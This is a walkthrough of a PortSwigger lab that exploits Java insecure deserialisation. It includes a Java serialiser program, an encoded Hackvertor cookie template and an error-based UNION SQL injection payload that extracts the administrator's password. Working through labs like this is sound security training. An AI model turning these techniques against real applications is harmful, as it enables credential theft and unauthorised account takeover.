# Developing a custom gadget chain for Java deserialisation

## Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization) uses a serialization-based session mechanism. By constructing a suitable gadget chain, it is possible to exploit this lab's insecure deserialization to obtain the administrator's password. 

## Reproduction and proof of concept

###  Identify the vulnerability

1. Log in to your own account and notice the session cookie contains a serialized Java object.
2. From the site map, notice that the website references the file `/backup/AccessTokenUser.java`. You can successfully request this file in Burp Repeater.
3. Navigate upward to the `/backup` directory and notice that it also contains a `ProductTemplate.java` file.
4. Notice that the `ProductTemplate.readObject()` method passes the template's id attribute into a SQL statement.
5. Based on the leaked source code, write a small Java program that instantiates a `ProductTemplate` with an arbitrary ID, serializes it, and then Base64-encodes it.

```html
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("your-payload-here");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

6. Use the Java program to create a `ProductTemplate` with the `id` set to a single apostrophe. Copy the Base64 string and submit it in a request as your session cookie. The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialised object. 

###  Extract the password

Having identified this vulnerability, you now need to find a way to exploit it to extract the administrator's password. At this point, you have the following options for testing different payloads:

* Make changes in your Java file like in the previous step, recompile it, and run it again before pasting the new value into your session cookie. This can be time-consuming as you'll have to repeat all of these steps for each payload you want to test.
* Alternatively, you can use the [Hackvertor extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100). You can then paste the raw serialized object into Burp Repeater and add tags that will update the offsets and Base64-encode the object automatically. This makes it much quicker to test a large number of payloads, and is even compatible with Burp Intruder.

This template is Base64-encoded here to avoid copy/paste issues:

```text
PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+
```

To use this template:

1. Copy and paste it into your session cookie in Burp Repeater.
2. Base64-decode it to reveal something that looks like this:

```text
<@base64_4>¬ísr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode_3><@get_len /><@/from_charcode_3>YOUR-PAYLOAD-HERE<@set_len><@length_0>YOUR-PAYLOAD-HERE<@/length_0><@/set_len><@/base64_4>
```
    
3. Replace both occurrences of YOUR-PAYLOAD-HERE with the payload that you want to test. Leave everything else as it is.
4. Send the request. If you want to check the output that Hackvertor generated, you can look at the request on the "Logger" tab.

There are several ways to extract the password, but for this solution, a simple, error-based UNION attack will suffice.

5. Enumerate the number of columns in the table (8).
6. Determine the data type of the columns and identify that columns 4, 5, and 6 do not expect values of the type string. Importantly, notice that the error message reflects the string input that you entered.
7. List the contents of the database and identify that there is a table called users with a column called password.
8. Use a suitable SQL injection payload to extract the password from the users table. For example, the following payload will trigger an exception that displays the password in the error message:

```text
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```
    
9. To solve the lab, log in as administrator using the extracted password, open the admin panel, and delete Carlos's account.

## Exploitability

An attacker will need to log in to `wiener:peter`; gain access to the source code and use it to construct a gadget chain to obtain the administrator's password; and then, log in as the administrator and delete Carlos's account.
